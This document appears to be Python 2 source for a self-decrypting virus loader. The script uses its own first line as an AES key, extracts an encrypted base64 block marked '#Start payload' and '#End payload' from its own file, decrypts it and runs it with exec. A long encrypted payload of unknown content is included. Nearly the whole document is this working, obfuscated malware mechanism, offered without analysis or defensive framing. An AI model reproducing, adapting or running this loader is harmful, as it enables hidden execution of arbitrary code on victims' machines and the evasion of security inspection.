######################################################## First script python
# coding=utf-8
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload)
print e
exec e

sys.exit('Good job!')
#Start payload
#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
#End payload